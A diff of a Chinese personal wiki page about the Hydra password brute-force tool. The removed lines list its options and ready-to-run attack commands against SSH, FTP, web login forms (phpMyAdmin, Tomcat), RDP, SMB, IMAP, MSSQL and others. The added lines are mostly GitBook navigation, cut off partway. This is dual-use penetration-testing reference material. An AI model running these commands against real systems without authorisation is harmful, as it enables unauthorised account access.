@@ -1,153 +1,2010 @@
+
 <!DOCTYPE HTML>
-<html>
+<html lang="cn" >
     <head>
-        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
-        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
-        <title>Hydra - Wiki | janes</title>
-        <meta name="keywords" content=""/>
-        <meta name="description" content=""/>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    </head>
-
-    <body>
-        <div id="container">
-            
-<div id="header">
-  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#Kali2">Kali2</a>&nbsp;»&nbsp;Hydra</div>
-</div>
-<div class="clearfix"></div>
-<div id="title">Hydra</div>
-  <div id="content">
-  <h2 id="0x00-hydra">0x00 hydra</h2>
-<p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具,支持破解多种密码。</p>
-<h2 id="0x01-option">0x01 option</h2>
-<div class="hlcode"><pre><span class="na">-R</span>          <span class="err">继续从上一次进度接着破解</span>
-<span class="na">-S</span>          <span class="err">采用</span><span class="nx">SSL</span><span class="err">链接</span>
-<span class="na">-s</span> <span class="o">&lt;</span><span class="nb">PORT</span><span class="o">&gt;</span>   <span class="err">可通过这个参数指定非默认端口</span>
-<span class="na">-l</span> <span class="o">&lt;</span><span class="nx">LOGIN</span><span class="o">&gt;</span>  <span class="err">指定破解的用户，对特定用户破解</span>
-<span class="na">-L</span> <span class="o">&lt;</span><span class="nb">FILE</span><span class="o">&gt;</span>   <span class="err">指定用户名字典</span>
-<span class="na">-p</span> <span class="o">&lt;</span><span class="nb">PASS</span><span class="o">&gt;</span>   <span class="err">指定密码破解，少用，一般是采用密码字典</span>
-<span class="na">-P</span> <span class="o">&lt;</span><span class="nb">FILE</span><span class="o">&gt;</span>   <span class="err">指定密码字典</span>
-<span class="na">-e</span> <span class="o">&lt;</span><span class="nx">nsr</span><span class="o">&gt;</span>     <span class="err">额外可选选项，</span><span class="nb">n</span> <span class="p">(</span><span class="err">空密碼，即不指定密碼</span><span class="p">)</span><span class="err">，</span> <span class="nb">s</span> <span class="p">(</span><span class="err">將帳號同時當成密碼用</span><span class="p">)</span><span class="err">，</span><span class="nb">r</span> <span class="p">(</span><span class="err">將帳號</span><span class="o">/</span><span class="err">密碼調換使用</span><span class="p">)</span>
-<span class="na">-C</span> <span class="o">&lt;</span><span class="nb">FILE</span><span class="o">&gt;</span>   <span class="err">使用冒号分割格式，例如“登录名</span><span class="p">:</span><span class="err">密码”来代替</span><span class="na">-L</span><span class="o">/-</span><span class="nx">P</span><span class="err">参数</span>
-<span class="na">-M</span> <span class="o">&lt;</span><span class="nb">FILE</span><span class="o">&gt;</span>   <span class="err">指定目标列表文件一行一条</span>
-<span class="na">-o</span> <span class="o">&lt;</span><span class="nb">FILE</span><span class="o">&gt;</span>   <span class="err">指定结果输出文件</span>
-<span class="na">-f</span>          <span class="err">在使用</span><span class="na">-M</span><span class="err">参数以后，找到第一对登录名或者密码的时候中止破解</span>
-<span class="na">-t</span> <span class="o">&lt;</span><span class="nb">TASKS</span><span class="o">&gt;</span>  <span class="err">同时运行的线程数，默认为</span><span class="mi">16</span>
-<span class="na">-w</span> <span class="o">&lt;</span><span class="nb">TIME</span><span class="o">&gt;</span>   <span class="err">设置最大超时的时间，单位秒，默认是</span><span class="mi">30</span><span class="nb">s</span>
-<span class="na">-v</span> <span class="o">/</span> <span class="na">-V</span>     <span class="err">显示详细过程</span>
-<span class="na">-SuvVd46</span><span class="err">：是多個選項的組合，分別表示：</span>
-    <span class="nb">S</span><span class="err">：使用</span><span class="nx">SSL</span><span class="err">連線</span>
-    <span class="nx">u</span><span class="err">：每一組密碼都用帳號輪流測試，而不是每一組帳號用密碼輪流測試。</span>
-    <span class="nx">v</span> <span class="nx">V</span> <span class="nb">d</span> <span class="nx">U</span> <span class="err">是訊息的詳細度</span>
-    <span class="mi">4</span> <span class="mi">6</span> <span class="err">是</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="err">格式</span><span class="p">(</span><span class="nx">IPv4</span> <span class="err">或</span> <span class="nx">IPv6</span><span class="p">)</span>
-<span class="nx">server</span>      <span class="err">目标</span><span class="nx">ip</span>
-<span class="nx">service</span>     <span class="err">指定服务名，支持的服务和协议：</span><span class="nx">telnet</span> <span class="nx">ftp</span> <span class="nx">pop3</span><span class="err">[</span><span class="na">-ntlm</span><span class="cp">]</span> imap<span class="cp">[</span><span class="na">-ntlm</span><span class="cp">]</span> smb smbnt http<span class="cp">[</span><span class="nb">s</span><span class="cp">]</span>-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth<span class="cp">[</span><span class="na">-ntlm</span><span class="cp">]</span> pcanywhere teamspeak sip vmauthd firebird ncp afp等等
-</pre></div>
-
-
-<h2 id="0x02-use-demo">0x02 use demo</h2>
-<h3 id="ssh"><code>ssh</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="err">用户名</span> <span class="o">-</span><span class="n">p</span> <span class="err">密码字典</span> <span class="o">-</span><span class="n">t</span> <span class="err">线程</span> <span class="o">-</span><span class="n">vV</span> <span class="o">-</span><span class="n">e</span> <span class="n">ns</span> <span class="n">ip</span> <span class="n">ssh</span>
-<span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="err">用户名</span> <span class="o">-</span><span class="n">p</span> <span class="err">密码字典</span> <span class="o">-</span><span class="n">t</span> <span class="err">线程</span> <span class="o">-</span><span class="n">o</span> <span class="n">save</span><span class="p">.</span><span class="n">log</span> <span class="o">-</span><span class="n">vV</span> <span class="n">ip</span> <span class="n">ssh</span>
-</pre></div>
-
-
-<h3 id="ftp"><code>ftp</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="n">ip</span> <span class="n">ftp</span> <span class="o">-</span><span class="n">l</span> <span class="err">用户名</span> <span class="o">-</span><span class="n">P</span> <span class="err">密码字典</span> <span class="o">-</span><span class="n">t</span> <span class="err">线程</span><span class="p">(</span><span class="err">默认</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span><span class="n">vV</span>
-<span class="n">hydra</span> <span class="n">ip</span> <span class="n">ftp</span> <span class="o">-</span><span class="n">l</span> <span class="err">用户名</span> <span class="o">-</span><span class="n">P</span> <span class="err">密码字典</span> <span class="o">-</span><span class="n">e</span> <span class="n">ns</span> <span class="o">-</span><span class="n">vV</span>
-</pre></div>
-
-
-<h3 id="http">http</h3>
-<ul>
-<li>http post form attack</li>
-</ul>
-<div class="hlcode"><pre><span class="nx">hydra</span> <span class="na">-l</span> <span class="nx">admin</span> <span class="na">-P</span> <span class="nx">pass.lst</span> <span class="na">-o</span> <span class="nx">ok.lst</span> <span class="na">-t</span> <span class="mi">1</span> <span class="na">-f</span> <span class="mf">127.0.0.1</span> <span class="nx">http</span><span class="na">-post-form</span> <span class="err">“</span><span class="p">/</span><span class="nx">login.php</span><span class="p">:</span><span class="n">name</span><span class="o">=</span><span class="p">^</span><span class="nb">USER</span><span class="p">^</span><span class="o">&amp;</span><span class="n">pwd</span><span class="o">=</span><span class="p">^</span><span class="nb">PASS</span><span class="p">^:</span><span class="nx">incorrect</span><span class="p">:</span><span class="n">H</span><span class="o">=</span><span class="nb">Cookie</span><span class="p">:</span> <span class="n">security</span><span class="o">=</span><span class="nx">low</span><span class="p">;</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="nx">o7qiqd9fc1d003u9d38k64t0f4</span><span class="err">”</span>
-<span class="nx">hydra</span> <span class="na">-l</span> <span class="nx">admin</span> <span class="na">-P</span> <span class="nx">passwords.lst</span> <span class="na">-e</span> <span class="nx">ns</span> <span class="na">-vV</span> <span class="mf">192.168.2.10</span> <span class="nx">http</span><span class="na">-post-form</span> <span class="s2">&quot;/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^&amp;server=1:denied&quot;</span>
-<span class="nx">hydra</span> <span class="na">-l</span> <span class="err">用户名</span> <span class="na">-P</span> <span class="err">密码字典</span> <span class="na">-s</span> <span class="mi">80</span> <span class="nx">ip</span> <span class="nx">http</span><span class="na">-post-form</span> <span class="s2">&quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;</span>
-<span class="nx">hydra</span> <span class="na">-t</span> <span class="mi">3</span> <span class="na">-l</span> <span class="nx">admin</span> <span class="na">-P</span> <span class="nx">pass.txt</span> <span class="na">-o</span> <span class="nx">out.txt</span> <span class="na">-f</span> <span class="mf">10.36.16.18</span> <span class="nx">http</span><span class="na">-post-form</span> <span class="s2">&quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&quot;</span>
-</pre></div>
-
-
-<blockquote>
-<p>http-post-form or http-get-form</p>
-<p>incorrect表示错误猜解的返回信息提示，自定义,最好和页面返回的信息一致，不要略写，不然可能产生错报，具体原因待去看源码</p>
-</blockquote>
-<p><strong>:H= 表示手工设置的Header</strong></p>
-<ul>
-<li>http get</li>
-</ul>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="err">用户名</span> <span class="o">-</span><span class="n">p</span> <span class="err">密码字典</span> <span class="o">-</span><span class="n">t</span> <span class="err">线程</span> <span class="o">-</span><span class="n">vV</span> <span class="o">-</span><span class="n">e</span> <span class="n">ns</span> <span class="n">ip</span> <span class="n">http</span><span class="o">-</span><span class="n">get</span> <span class="o">/</span><span class="n">admin</span><span class="o">/</span>
-<span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="err">用户名</span> <span class="o">-</span><span class="n">p</span> <span class="err">密码字典</span> <span class="o">-</span><span class="n">t</span> <span class="err">线程</span> <span class="o">-</span><span class="n">vV</span> <span class="o">-</span><span class="n">e</span> <span class="n">ns</span> <span class="o">-</span><span class="n">f</span> <span class="n">ip</span> <span class="n">http</span><span class="o">-</span><span class="n">get</span> <span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span>
-</pre></div>
-
-
-<p>比如爆破登陆密码: </p>
-<p><code>phpmyadmin</code></p>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">root</span> <span class="o">-</span><span class="n">P</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">pwd</span><span class="p">.</span><span class="n">lst</span> <span class="o">-</span><span class="n">e</span> <span class="n">ns</span> <span class="o">-</span><span class="n">vV</span> <span class="o">-</span><span class="n">f</span> <span class="mf">192.168.32.6</span> <span class="n">http</span><span class="o">-</span><span class="n">get</span> <span class="o">/</span><span class="n">phpmyadmin</span><span class="o">/</span>
-</pre></div>
-
-
-<p><code>tomcat</code></p>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">tomcat</span> <span class="o">-</span><span class="n">P</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">top50000</span> <span class="o">-</span><span class="n">t</span> <span class="mi">16</span> <span class="o">-</span><span class="n">ens</span> <span class="o">-</span><span class="n">f</span> <span class="o">-</span><span class="n">vV</span> <span class="mf">192.168.32.6</span> <span class="o">-</span><span class="n">s</span> <span class="mi">8081</span> <span class="n">http</span><span class="o">-</span><span class="n">get</span> <span class="o">/</span><span class="n">manager</span><span class="o">/</span><span class="n">html</span>
-</pre></div>
-
-
-<h3 id="https"><code>https</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">m</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span> <span class="o">-</span><span class="n">l</span> <span class="n">muts</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="mf">10.36.16.18</span> <span class="n">https</span>
-</pre></div>
-
-
-<h3 id="teamspeak"><code>teamspeak</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="err">用户名</span> <span class="o">-</span><span class="n">P</span> <span class="err">密码字典</span> <span class="o">-</span><span class="n">s</span> <span class="err">端口号</span> <span class="o">-</span><span class="n">vV</span> <span class="n">ip</span> <span class="n">teamspeak</span>
-</pre></div>
-
-
-<h3 id="cisco"><code>cisco</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="mf">10.36.16.18</span> <span class="n">cisco</span>
-<span class="n">hydra</span> <span class="o">-</span><span class="n">m</span> <span class="n">cloud</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="mf">10.36.16.18</span> <span class="n">cisco</span><span class="o">-</span><span class="n">enable</span>
-</pre></div>
-
-
-<h3 id="smb"><code>smb</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="mf">10.36.16.18</span> <span class="n">smb</span>
-</pre></div>
-
-
-<h3 id="pop3"><code>pop3</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">muts</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="n">my</span><span class="p">.</span><span class="n">pop3</span><span class="p">.</span><span class="n">mail</span> <span class="n">pop3</span>
-</pre></div>
-
-
-<h3 id="rdp"><code>rdp</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="n">ip</span> <span class="n">rdp</span> <span class="o">-</span><span class="n">l</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">V</span>
-</pre></div>
-
-
-<h3 id="http-proxy"><code>http-proxy</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">admin</span> <span class="o">-</span><span class="n">P</span> <span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="n">http</span><span class="o">-</span><span class="n">proxy</span><span class="o">:</span><span class="c1">//10.36.16.18</span>
-</pre></div>
-
-
-<h3 id="imap"><code>imap</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">L</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="n">secret</span> <span class="mf">10.36.16.18</span> <span class="n">imap</span> <span class="n">PLAIN</span>
-<span class="n">hydra</span> <span class="o">-</span><span class="n">C</span> <span class="n">defaults</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="mi">6</span> <span class="n">imap</span><span class="o">:</span><span class="c1">//[fe80::2c:31ff:fe12:ac11]:143/PLAIN</span>
-</pre></div>
-
-
-<h3 id="mssql"><code>mssql</code></h3>
-<div class="hlcode"><pre><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">sa</span> <span class="o">-</span><span class="n">P</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Password</span><span class="o">/</span><span class="n">pass</span><span class="p">.</span><span class="n">txt</span> <span class="n">mssql</span><span class="o">:</span><span class="c1">//192.168.1.11 -o ok.txt</span>
-</pre></div>
-</div>
-
-        </div>
-        <div id="footer">
-            <span>
-                Copyright © 2012-2016 .
-                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
-            </span>
-        </div>
+        <title>Hydra · Wiki | janes</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.0">
+        <meta name="author" content="janes">
         
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="mitmproxy.html" />
+    
+    
+    <link rel="prev" href="gather-information.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Wiki
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    Python
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../Python/anaconda.html">
+            
+                <a href="../Python/anaconda.html">
+            
+                    
+                    Anaconda
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../Python/django.html">
+            
+                <a href="../Python/django.html">
+            
+                    
+                    Django 1.8.7
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../Python/excel.html">
+            
+                <a href="../Python/excel.html">
+            
+                    
+                    Excel
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../Python/flask.html">
+            
+                <a href="../Python/flask.html">
+            
+                    
+                    Flask
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../Python/flask_github_api_login.html">
+            
+                <a href="../Python/flask_github_api_login.html">
+            
+                    
+                    Flask github api login
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../Python/函数.html">
+            
+                <a href="../Python/函数.html">
+            
+                    
+                    Function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../Python/http_server.html">
+            
+                <a href="../Python/http_server.html">
+            
+                    
+                    Http_server
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../Python/iterators.html">
+            
+                <a href="../Python/iterators.html">
+            
+                    
+                    Iterators
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../Python/log.html">
+            
+                <a href="../Python/log.html">
+            
+                    
+                    Log
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../Python/pickle.html">
+            
+                <a href="../Python/pickle.html">
+            
+                    
+                    Pickle
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../Python/pythonic.html">
+            
+                <a href="../Python/pythonic.html">
+            
+                    
+                    Pythonic
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../Python/random.html">
+            
+                <a href="../Python/random.html">
+            
+                    
+                    Random
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../Python/scapy.html">
+            
+                <a href="../Python/scapy.html">
+            
+                    
+                    Scapy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../Python/selenium.html">
+            
+                <a href="../Python/selenium.html">
+            
+                    
+                    Selenium and Xvfb 
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../Python/socket.html">
+            
+                <a href="../Python/socket.html">
+            
+                    
+                    Socket
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../Python/network_package.html">
+            
+                <a href="../Python/network_package.html">
+            
+                    
+                    network package
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../Python/note.html">
+            
+                <a href="../Python/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../Python/eval.html">
+            
+                <a href="../Python/eval.html">
+            
+                    
+                    动态执行字符串代码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../Python/command.html">
+            
+                <a href="../Python/command.html">
+            
+                    
+                    命令执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.20" data-path="../Python/buildin_type.html">
+            
+                <a href="../Python/buildin_type.html">
+            
+                    
+                    常用内置对象操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.21" data-path="../Python/常用模块.html">
+            
+                <a href="../Python/常用模块.html">
+            
+                    
+                    常用模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.22" data-path="../Python/wechat.html">
+            
+                <a href="../Python/wechat.html">
+            
+                    
+                    微信公众号开发
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.23" data-path="../Python/模拟http-post-upload-file.html">
+            
+                <a href="../Python/模拟http-post-upload-file.html">
+            
+                    
+                    模拟HTTP POST upload file
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.24" data-path="../Python/自省.html">
+            
+                <a href="../Python/自省.html">
+            
+                    
+                    自省
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.25" data-path="../Python/运维.html">
+            
+                <a href="../Python/运维.html">
+            
+                    
+                    运维
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.26" data-path="../Python/processing.html">
+            
+                <a href="../Python/processing.html">
+            
+                    
+                    进(线程)程处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.27" data-path="../Python/迭代器和生成器.html">
+            
+                <a href="../Python/迭代器和生成器.html">
+            
+                    
+                    迭代器和生成器
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../Linux/centos.html">
+            
+                <a href="../Linux/centos.html">
+            
+                    
+                    Centos7
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../Linux/cmdline.html">
+            
+                <a href="../Linux/cmdline.html">
+            
+                    
+                    Cmdline
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../Linux/ncat.html">
+            
+                <a href="../Linux/ncat.html">
+            
+                    
+                    Nc
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../Linux/nmap.html">
+            
+                <a href="../Linux/nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../Linux/ubuntu.html">
+            
+                <a href="../Linux/ubuntu.html">
+            
+                    
+                    Ubuntu
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    WebSecurity
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../WebSecurity/attacktool.html">
+            
+                <a href="../WebSecurity/attacktool.html">
+            
+                    
+                    AttackTool
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../WebSecurity/csrf.html">
+            
+                <a href="../WebSecurity/csrf.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../WebSecurity/dns.html">
+            
+                <a href="../WebSecurity/dns.html">
+            
+                    
+                    DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../WebSecurity/mysqlinject.html">
+            
+                <a href="../WebSecurity/mysqlinject.html">
+            
+                    
+                    Mysql 注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../WebSecurity/note.html">
+            
+                <a href="../WebSecurity/note.html">
+            
+                    
+                    Note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="../WebSecurity/php序列化.html">
+            
+                <a href="../WebSecurity/php序列化.html">
+            
+                    
+                    PHP序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="../WebSecurity/ssti-jinja2.html">
+            
+                <a href="../WebSecurity/ssti-jinja2.html">
+            
+                    
+                    SSTI Jinja2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="../WebSecurity/scan_for_info.html">
+            
+                <a href="../WebSecurity/scan_for_info.html">
+            
+                    
+                    Scan For Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="../WebSecurity/sqlinject.html">
+            
+                <a href="../WebSecurity/sqlinject.html">
+            
+                    
+                    SqlInject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="../WebSecurity/vulnapp.html">
+            
+                <a href="../WebSecurity/vulnapp.html">
+            
+                    
+                    Vulnapp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="../WebSecurity/xss.html">
+            
+                <a href="../WebSecurity/xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="../WebSecurity/backdoor.html">
+            
+                <a href="../WebSecurity/backdoor.html">
+            
+                    
+                    backdoor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="../WebSecurity/linux提权.html">
+            
+                <a href="../WebSecurity/linux提权.html">
+            
+                    
+                    linux提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="../WebSecurity/mysql.html">
+            
+                <a href="../WebSecurity/mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="../WebSecurity/mysql宽字节注入.html">
+            
+                <a href="../WebSecurity/mysql宽字节注入.html">
+            
+                    
+                    mysql宽字节注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="../WebSecurity/mysql注入过滤.html">
+            
+                <a href="../WebSecurity/mysql注入过滤.html">
+            
+                    
+                    mysql注入过滤
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.17" data-path="../WebSecurity/php.html">
+            
+                <a href="../WebSecurity/php.html">
+            
+                    
+                    php
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.18" data-path="../WebSecurity/php-match-or-comapre.html">
+            
+                <a href="../WebSecurity/php-match-or-comapre.html">
+            
+                    
+                    php match or comapre
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.19" data-path="../WebSecurity/php-文件包含.html">
+            
+                <a href="../WebSecurity/php-文件包含.html">
+            
+                    
+                    php 文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.20" data-path="../WebSecurity/ssrf.html">
+            
+                <a href="../WebSecurity/ssrf.html">
+            
+                    
+                    ssrf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.21" data-path="../WebSecurity/url.html">
+            
+                <a href="../WebSecurity/url.html">
+            
+                    
+                    url
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.22" data-path="../WebSecurity/webshell.html">
+            
+                <a href="../WebSecurity/webshell.html">
+            
+                    
+                    webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.23" data-path="../WebSecurity/web渗透测试.html">
+            
+                <a href="../WebSecurity/web渗透测试.html">
+            
+                    
+                    web渗透测试
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.24" data-path="../WebSecurity/常用端口.html">
+            
+                <a href="../WebSecurity/常用端口.html">
+            
+                    
+                    常用端口
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.25" data-path="../WebSecurity/常见协议.html">
+            
+                <a href="../WebSecurity/常见协议.html">
+            
+                    
+                    常见协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.26" data-path="../WebSecurity/敏感配置文件.html">
+            
+                <a href="../WebSecurity/敏感配置文件.html">
+            
+                    
+                    敏感配置文件
+            
+                </a>
+            
+
+            
